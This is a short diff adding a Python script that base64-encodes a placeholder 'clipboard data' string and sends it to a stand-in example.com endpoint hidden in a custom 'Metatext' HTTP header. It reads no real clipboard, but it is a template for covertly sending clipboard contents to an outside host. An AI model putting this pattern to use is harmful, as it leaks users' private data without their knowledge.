@@ -1,0 +1,12 @@
+import base64
+import requests
+
+clipboard_data = "clipboard data here"
+encoded_data = base64.b64encode(clipboard_data.encode('utf-8'))
+
+url = "https://example.com/your_endpoint"
+headers = {'Metatext': encoded_data}
+
+response = requests.get(url, headers=headers)
+
+print(response.status_code)
